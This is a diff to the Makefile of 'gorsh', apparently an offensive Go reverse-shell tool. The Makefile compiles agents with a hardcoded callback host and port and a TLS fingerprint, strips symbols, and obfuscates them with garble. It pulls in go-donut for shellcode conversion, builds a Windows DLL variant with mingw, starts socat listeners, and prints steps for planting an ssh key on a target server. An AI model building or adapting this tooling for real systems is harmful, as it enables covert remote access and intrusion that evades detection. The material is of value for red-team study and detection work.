@@ -11,22 +11,19 @@ BUILD=go build -trimpath -buildmode=pie
 PLATFORMS=linux windows darwin
 target=$(word 1, $@)
 
-AGT_SRC =cmd/gorsh/*
-SRV_SRC =cmd/gorsh-listen/*
-
 LHOST ?= 127.0.0.1
 LPORT ?= 8443
 
 FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
-LD.windows = "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
-LD.linux = "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
+LD.windows = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
+LD.linux = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
 LD.darwin = ${LD.linux}
-
-MINGW=x86_64-w64-mingw32-gcc
-CXX=x86_64-w64-mingw32-g++
 
 GARBLE=${GOPATH}/bin/garble
 GODONUT=${GOPATH}/bin/go-donut
+MINGW=x86_64-w64-mingw32-gcc
+CXX=x86_64-w64-mingw32-g++
+
 
 # zStd is a highly efficient compression library that requires CGO compilation If you'd like to
 # turn this feature on and have experience cross-compiling with cgo, enable the feature below for
@@ -36,10 +33,7 @@ GODONUT=${GOPATH}/bin/go-donut
 all: $(PLATFORMS) servers
 
 ${PLATFORMS}: $(GARBLE) $(PKEY) $(SRV_KEY)
-	GOOS=${target} ${BUILD} \
-		-ldflags ${LD.${target}} \
-		-o ${OUT}/${APP}-${target} \
-		${AGT_SRC}
+	GOOS=${target} ${BUILD} -ldflags ${LD.${target}} -o ${OUT}/${APP}.${target} cmd/gorsh/*
 
 listen-socat: $(SRV_KEY)
 	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen-socat.sh scripts/start.sh
@@ -48,19 +42,22 @@ listen: $(SRV_KEY)
 	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh
 
 server:
-	GOOS=linux ${BUILD} -ldflags ${LD.linux} -o ${OUT}/srv/gorsh-server ${SRV_SRC}
+	GOOS=linux ${BUILD} -ldflags ${LD.linux} -o ${OUT}/srv/gorsh-server cmd/gorsh-listen/*
 
 windll:
-	@# https://stackoverflow.com/questions/40573401/building-a-dll-with-go-1-7
-	@cp cmd/gorsh/main.go ${OUT}/${NAME}.go
-	@sed -i '1 a import "C"' ${OUT}/${NAME}.go
-	@echo '//export Run' >> ${OUT}/${NAME}.go
-	@echo 'func Run() { main() }' >> ${OUT}/${NAME}.go
-	cp scripts/gorsh.c ${OUT}/
+	# https://stackoverflow.com/questions/40573401/building-a-dll-with-go-1-7
+	@cp cmd/gorsh/main.go ${OUT}/${APP}.go
+	@sed -i '1 a import "C"' ${OUT}/${APP}.go
+	@echo '//export Run' >> ${OUT}/${APP}.go
+	@echo 'func Run() { main() }' >> ${OUT}/${APP}.go
+	@cp scripts/gorsh.c ${OUT}/
 
-	CGO_ENABLED=1 CC=${MINGW} CXX=${CXX} GOOS=windows GOARCH=amd64 \
-	${BUILD} ${LINUX_LDFLAGS} ${ZSTD} -buildmode=c-archive -o ${OUT}/${NAME}.a ${OUT}/${NAME}.go
-	${MINGW} -shared -pthread -o ${OUT}/${NAME}.dll ${OUT}/${NAME}.c ${OUT}/${NAME}.a -lwinmm -lntdll -lws2_32
+	CGO_ENABLED=1 CC=${MINGW} CXX=${CXX} \
+		GOOS=windows ${BUILD} ${LINUX_LDFLAGS} ${ZSTD} \
+		-buildmode=c-archive \
+		-o ${OUT}/${APP}.a ${OUT}/${APP}.go
+
+		${MINGW} -shared -pthread -o ${OUT}/${APP}.dll ${OUT}/${APP}.c ${OUT}/${APP}.a -lwinmm -lntdll -lws2_32
 
 clean:
 	rm -rf ${OUT} ${PKEY}* certs/*
@@ -76,7 +73,7 @@ $(GARBLE):
 	go get mvdan.cc/garble
 
 $(GODONUT):
-	go get -u github.com/Binject/go-donut
+	go get github.com/Binject/go-donut
 
 $(PKEY):
 	ssh-keygen -t ed25519 -f ${target} -N ''
@@ -86,7 +83,7 @@ $(PKEY):
 	@echo "================================================="
 	@echo
 	@echo "# The following creates a user with a /bin/false shell on the target ssh server."
-	@echo "# And appends the following line to that user's authorized_keys file"
+	@echo "# And appends the generated key to that user's authorized_keys file"
 	@echo
 	@echo "HDIR=/home/sshuser"
 	@echo "useradd -s /bin/false -m -d \$${HDIR} -N sshuser"
@@ -101,7 +98,7 @@ $(PKEY):
 
 
 $(SRV_KEY) $(SRV_PEM) &:
-	@openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
+	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
 	@cat ${SRV_KEY} >> ${SRV_PEM}
 
-.PHONY: $(PLATFORMS) clean listen servers listen-socat
+.PHONY: $(PLATFORMS) clean listen server listen-socat
